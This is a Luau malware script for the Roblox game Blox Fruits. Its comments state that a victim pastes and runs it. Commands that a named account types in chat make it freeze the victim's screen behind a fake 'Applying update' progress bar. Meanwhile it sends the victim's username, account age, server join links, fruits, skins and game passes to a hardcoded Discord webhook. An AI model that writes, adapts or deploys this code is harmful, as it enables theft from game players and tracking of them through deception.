-- lang: Luau, file: chat_commands.lua, target: Blox Fruits Sea 2/3
-- victim pastes and runs this. BLACKGOKU_0707 types commands in chat.

if getgenv().chatHooked then
    warn("already hooked") ; return
end
getgenv().chatHooked = true

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")
local StarterGui        = game:GetService("StarterGui")
local UserInputService  = game:GetService("UserInputService")

local AUTHORIZED = "BLACKGOKU_0707"
local WEBHOOK    = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY"

local lp   = Players.LocalPlayer
local http = (syn and syn.request) or http_request
           or (fluxus and fluxus.request) or request or nil

-- ── helpers ───────────────────────────────────────────────────────────────
local function getCommF()
    local r = ReplicatedStorage:FindFirstChild("Remotes")
    return r and r:FindFirstChild("CommF_") or nil
end

local function post(payload)
    if not http then warn("[EM] no http func") ; return end
    local ok, enc = pcall(function()
        return HttpService:JSONEncode(payload)
    end)
    if not ok then warn("[EM] encode fail: "..tostring(enc)) ; return end
    pcall(function()
        http({ Url=WEBHOOK, Method="POST",
               Headers={["Content-Type"]="application/json"}, Body=enc })
    end)
end

-- ── freeze ────────────────────────────────────────────────────────────────
local freezeGui = nil
local frozen    = false

local function freeze()
    if frozen then return end
    frozen = true
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    pcall(function() UserInputService.MouseIconEnabled = false end)

    local pg = lp:WaitForChild("PlayerGui")
    if pg:FindFirstChild("EMFreeze") then
        pg:FindFirstChild("EMFreeze"):Destroy()
    end

    local gui = Instance.new("ScreenGui")
    gui.Name           = "EMFreeze"
    gui.ResetOnSpawn   = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent         = pg
    freezeGui          = gui

    local bg = Instance.new("Frame")
    bg.Size             = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(8,9,12)
    bg.BorderSizePixel  = 0
    bg.ZIndex           = 10
    bg.Parent           = gui

    local card = Instance.new("Frame")
    card.Size             = UDim2.new(0,340,0,210)
    card.Position         = UDim2.new(0.5,-170,0.5,-105)
    card.BackgroundColor3 = Color3.fromRGB(14,16,22)
    card.BorderSizePixel  = 0
    card.ZIndex           = 11
    card.Parent           = bg
    local cc = Instance.new("UICorner")
    cc.CornerRadius = UDim.new(0,14) ; cc.Parent = card
    local cs = Instance.new("UIStroke")
    cs.Color = Color3.fromRGB(30,33,45) ; cs.Thickness=1 ; cs.Parent=card

    local spinner = Instance.new("ImageLabel")
    spinner.Size                = UDim2.new(0,52,0,52)
    spinner.Position            = UDim2.new(0.5,-26,0,22)
    spinner.BackgroundTransparency = 1
    spinner.Image               = "rbxasset://textures/loading/robloxTilt.png"
    spinner.ImageColor3         = Color3.fromRGB(88,101,242)
    spinner.ZIndex              = 12
    spinner.Parent              = card

    task.spawn(function()
        while frozen and spinner.Parent do
            spinner.Rotation = (spinner.Rotation + 4) % 360
            task.wait(0.016)
        end
    end)

    local title = Instance.new("TextLabel")
    title.Text                   = "Applying update…"
    title.TextColor3             = Color3.fromRGB(220,221,228)
    title.Font                   = Enum.Font.GothamBold
    title.TextSize               = 15
    title.BackgroundTransparency = 1
    title.Size                   = UDim2.new(1,-24,0,22)
    title.Position               = UDim2.new(0,12,0,84)
    title.TextXAlignment         = Enum.TextXAlignment.Center
    title.ZIndex                 = 12
    title.Parent                 = card

    local sub = Instance.new("TextLabel")
    sub.Text                   = "Please do not close the game"
    sub.TextColor3             = Color3.fromRGB(100,104,128)
    sub.Font                   = Enum.Font.Gotham
    sub.TextSize               = 11
    sub.BackgroundTransparency = 1
    sub.Size                   = UDim2.new(1,-24,0,16)
    sub.Position               = UDim2.new(0,12,0,108)
    sub.TextXAlignment         = Enum.TextXAlignment.Center
    sub.ZIndex                 = 12
    sub.Parent                 = card

    local track = Instance.new("Frame")
    track.Size             = UDim2.new(1,-32,0,8)
    track.Position         = UDim2.new(0,16,0,142)
    track.BackgroundColor3 = Color3.fromRGB(22,25,50)
    track.BorderSizePixel  = 0
    track.ZIndex           = 12
    track.Parent           = card
    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(0,4) ; tc.Parent = track

    local fill = Instance.new("Frame")
    fill.Size             = UDim2.new(0,0,1,0)
    fill.BackgroundColor3 = Color3.fromRGB(55,65,200)
    fill.BorderSizePixel  = 0
    fill.ZIndex           = 13
    fill.Parent           = track
    local fc = Instance.new("UICorner")
    fc.CornerRadius = UDim.new(0,4) ; fc.Parent = fill

    local pct = Instance.new("TextLabel")
    pct.Text                   = "0%"
    pct.TextColor3             = Color3.fromRGB(100,104,128)
    pct.Font                   = Enum.Font.GothamMedium
    pct.TextSize               = 11
    pct.BackgroundTransparency = 1
    pct.Size                   = UDim2.new(1,-24,0,16)
    pct.Position               = UDim2.new(0,12,0,158)
    pct.TextXAlignment         = Enum.TextXAlignment.Right
    pct.ZIndex                 = 12
    pct.Parent                 = card

    -- progress animation
    task.spawn(function()
        TweenService:Create(fill, TweenInfo.new(1.4,
            Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
            {Size=UDim2.new(0.72,0,1,0)}):Play()
        for i=0,72 do
            if not frozen then break end
            pct.Text = i.."%"
            task.wait(1.4/72)
        end
        TweenService:Create(fill, TweenInfo.new(6,
            Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
            {Size=UDim2.new(0.98,0,1,0)}):Play()
        for i=72,98 do
            if not frozen then break end
            pct.Text = i.."%"
            task.wait(6/26)
        end
        pct.Text = "98%"
    end)
end

local function unfreeze()
    frozen = false
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    pcall(function() UserInputService.MouseIconEnabled = true end)
    if freezeGui then freezeGui:Destroy() ; freezeGui = nil end
end

-- ── data collection + webhook ─────────────────────────────────────────────
local function exfil()
    local commF = getCommF()

    local inv, skins, passes = {}, {}, {}

    if commF then
        pcall(function()
            local res = commF:InvokeServer("getInventory")
            if type(res)=="table" then
                for slot, item in pairs(res) do
                    if type(item)=="table" then
                        item._slot = slot
                        table.insert(inv, item)
                    end
                end
            end
        end)
        pcall(function()
            local res = commF:InvokeServer("getSkins")
            if type(res)=="table" then skins = res end
        end)
        pcall(function()
            local res = commF:InvokeServer("getGamePasses")
            if type(res)=="table" then passes = res end
        end)
    end

    local userId  = tostring(lp.UserId)
    local placeId = tostring(game.PlaceId)
    local jobId   = game.JobId

    local joinDeep = string.format(
        "roblox://experiences/start?placeId=%s&gameInstanceId=%s",
        placeId, jobId)
    local joinWeb = string.format(
        "https://www.roblox.com/games/%s?privateServerLinkCode=%s",
        placeId, jobId)

    -- player embed
    local playerEmbed = {
        title  = "🎯 Target Online",
        color  = 0x5865F2,
        fields = {
            {name="Username",    value="`"..lp.Name.."`",          inline=true},
            {name="Display",     value="`"..lp.DisplayName.."`",   inline=true},
            {name="Account Age", value=lp.AccountAge.." days",     inline=true},
            {name="Place ID",    value="`"..placeId.."`",          inline=true},
            {name="Job ID",      value="```"..jobId.."```",        inline=false},
            {name="🔗 Join (client)",
             value="```"..joinDeep.."```",                         inline=false},
            {name="🌐 Join (browser)",
             value="```"..joinWeb.."```",                          inline=false},
        },
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                ..userId.."&width=420&height=420&format=png"
        },
        footer = {text = os.date("!%Y-%m-%dT%H:%M:%SZ")},
    }

    -- fruits embed
    local fruitLines = {}
    for _, item in ipairs(inv) do
        local t = item.Type or item.type or ""
        if t == "Blox Fruit" then
            table.insert(fruitLines, string.format("**%s** | Lv %s | %s",
                tostring(item.Name  or item.name  or "?"),
                tostring(item.Level or item.level or "?"),
                tostring(item.Rarity or item.rarity or "?")))
        end
    end
    local fruitEmbed = {
        title       = "🍎 Fruits ("..#fruitLines..")",
        color       = 0xf1c40f,
        description = #fruitLines>0
            and table.concat(fruitLines,"\n"):sub(1,4000)
            or  "*none*",
    }

    -- skins embed
    local skinLines = {}
    for _, s in ipairs(skins) do
        local limited = (s.Limited or s.limited) and "🔥 " or ""
        table.insert(skinLines, limited..tostring(s.Name or s.name or "?")
            .." — "..tostring(s.Rarity or s.rarity or "?"))
    end
    local skinsEmbed = {
        title       = "🎨 Skins ("..#skinLines..")",
        color       = 0x9b59b6,
        description = #skinLines>0
            and table.concat(skinLines,"\n"):sub(1,4000)
            or  "*none*",
    }

    -- passes embed
    local passLines = {}
    for _, p in ipairs(passes) do
        table.insert(passLines,"✔ "..tostring(p.Name or p.name or tostring(p)))
    end
    local passEmbed = {
        title       = "🔑 Passes ("..#passLines..")",
        color       = 0x2ecc71,
        description = #passLines>0
            and table.concat(passLines,"\n"):sub(1,4000)
            or  "*none*",
    }

    post({
        username = "ExploitManager",
        content  = "@here — target acquired: **"..lp.Name.."**",
        embeds   = {playerEmbed, fruitEmbed, skinsEmbed, passEmbed},
    })
end

-- ── command dispatcher ────────────────────────────────────────────────────
local function dispatch(sender, msg)
    if sender ~= AUTHORIZED then return end
    msg = msg:match("^%s*(.-)%s*$") or ""
    if msg:sub(1,1) ~= "." then return end

    local parts = {}
    for tok in msg:gmatch("%S+") do table.insert(parts, tok) end
    local cmd  = parts[1]:sub(2):lower()
    local args = {}
    for i=2,#parts do table.insert(args,parts[i]) end

    if cmd == "exfil" then
        freeze()
        task.spawn(exfil)

    elseif cmd == "freeze" then
        freeze()

    elseif cmd == "unfreeze" then
        unfreeze()

    elseif cmd == "send" then
        task.spawn(exfil)

    elseif cmd == "tp" then
        local term = args[1]
        if not term then return end
        local wo = workspace:FindFirstChild("_WorldOrigin")
        if not wo then return end
        local locs = wo:FindFirstChild("Locations")
        if not locs then return end
        for _, child in ipairs(locs:GetChildren()) do
            if child.Name:lower():find(term:lower(),1,true) then
                local char = lp.Character
                local hrp  = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local pp = child:IsA("Model") and child.PrimaryPart
                    if pp then
                        hrp.CFrame = pp.CFrame + Vector3.new(0,3,0)
                    end
                end
                break
            end
        end

    elseif cmd == "help" then
        print(".exfil   — freeze + send all data")
        print(".freeze  — freeze screen only")
        print(".unfreeze— release screen")
        print(".send    — send data without freezing")
        print(".tp <x>  — teleport to location")
    end
end

-- ── hook: ALL three paths fire simultaneously ─────────────────────────────

-- path 1: LocalPlayer.Chatted (most reliable for own messages)
lp.Chatted:Connect(function(msg)
    dispatch(lp.Name, msg)
end)

-- path 2: listen for other players chatting (catches BLACKGOKU_0707 from server)
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg)
        dispatch(p.Name, msg)
    end)
end)
-- hook already-connected players
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= lp then
        p.Chatted:Connect(function(msg)
            dispatch(p.Name, msg)
        end)
    end
end

-- path 3: TextChatService fallback
pcall(function()
    local tcs = game:GetService("TextChatService")
    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
        tcs.OnIncomingMessage:Connect(function(msg)
            if not msg.TextSource then return end
            local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
            dispatch(sender and sender.Name or "", msg.Text or "")
        end)
    end
end)

print("[EM] chat hooked — waiting for "..AUTHORIZED)
